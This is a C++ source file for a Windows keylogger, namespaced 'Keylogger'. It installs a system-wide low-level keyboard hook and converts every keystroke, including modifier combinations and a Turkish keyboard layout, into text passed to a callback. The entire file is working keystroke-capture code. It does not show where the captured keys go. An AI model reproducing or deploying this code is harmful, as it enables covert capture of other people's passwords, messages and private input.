#include "hook.h"
#include <windows.h>
#include <iostream>
#include <unordered_map>
#include <mutex>
#include <thread>

namespace Keylogger {

    HHOOK g_KeyboardHook = nullptr;
    KeyCallback g_Callback = nullptr;

    std::string GetKeyName(DWORD vkCode, DWORD scanCode, bool shift, bool ctrl, bool alt) {
        std::string keyName = "";

        if (ctrl) keyName += "Ctrl+";
        if (alt) keyName += "Alt+";
        if (shift) keyName += "Shift+";

        if (vkCode >= 'A' && vkCode <= 'Z') {
            // Check real shift state (Shift + CapsLock logic could be applied here)
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isUpper = shift ^ caps;
            if (isUpper) {
                keyName += (char)vkCode; // A-Z
            } else {
                keyName += (char)(vkCode + 32); // a-z
            }
        } else if (vkCode >= '0' && vkCode <= '9') {
            keyName += (char)vkCode;
        } else {
            switch (vkCode) {
                case VK_SPACE: return "Space"; // Space handled specifically to break words
                case VK_RETURN: return "Enter";
                case VK_BACK: return "Backspace";
                case VK_TAB: return "Tab";
                case VK_ESCAPE: return "Esc";
                case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT: return ""; 
                case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL: return "";
                case VK_LMENU: case VK_RMENU: case VK_MENU: return "";
                case VK_UP: return "Up";
                case VK_DOWN: return "Down";
                case VK_LEFT: return "Left";
                case VK_RIGHT: return "Right";
                case VK_CAPITAL: return "CapsLock";
                
                // Turkish Keyboard Map (UTF-8 Hex strings to avoid compiler encoding issues)
                case VK_OEM_4: keyName += shift ? "\xC4\x9E" : "\xC4\x9F"; break; // Ğ / ğ (Was '[')
                case VK_OEM_6: keyName += shift ? "\xC3\x9C" : "\xC3\xBC"; break; // Ü / ü (Was ']')
                case VK_OEM_1: keyName += shift ? "\xC5\x9E" : "\xC5\x9F"; break; // Ş / ş (Was ';')
                case VK_OEM_7: keyName += shift ? "\xC4\xB0" : "i"; break;       // İ / i (Was '\'')
                case VK_OEM_5: keyName += shift ? "\xC3\x87" : "\xC3\xA7"; break; // Ç / ç (Was '\')
                case VK_OEM_3: keyName += shift ? "\"" : "\xC3\xA9"; break; // " / é (Was '`' or '~')
                case VK_OEM_PERIOD: keyName += shift ? ":" : "."; break;
                case VK_OEM_COMMA: keyName += shift ? ";" : ","; break;
                case VK_OEM_MINUS: keyName += shift ? "_" : "-"; break;
                case VK_OEM_2: keyName += shift ? "\xC3\x96" : "\xC3\xB6"; break; // Ö / ö

                default: 
                    keyName += "Key[" + std::to_string(vkCode) + "]";
                    break;
            }
        }

        return keyName;
    }

    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0) {
            // Process on KeyDown
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
                
                // Get modifier states
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                bool alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

                std::string keyStr = GetKeyName(kbdStruct->vkCode, kbdStruct->scanCode, shift, ctrl, alt);
                if (!keyStr.empty() && g_Callback) {
                    g_Callback(keyStr);
                }
            }
        }
        return CallNextHookEx(g_KeyboardHook, nCode, wParam, lParam);
    }

    DWORD g_HookThreadId = 0;

    void StartHook(KeyCallback callback) {
        g_HookThreadId = GetCurrentThreadId();
        g_Callback = callback;
        // Set up the hook
        g_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

        if (g_KeyboardHook == nullptr) {
            std::cerr << "Failed to install hook!" << std::endl;
            return;
        }

        // Message loop to keep hook active
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    void StopHook() {
        if (g_KeyboardHook) {
            UnhookWindowsHookEx(g_KeyboardHook);
            g_KeyboardHook = nullptr;
        }
        if (g_HookThreadId != 0) {
            PostThreadMessage(g_HookThreadId, WM_QUIT, 0, 0);
        }
    }
}
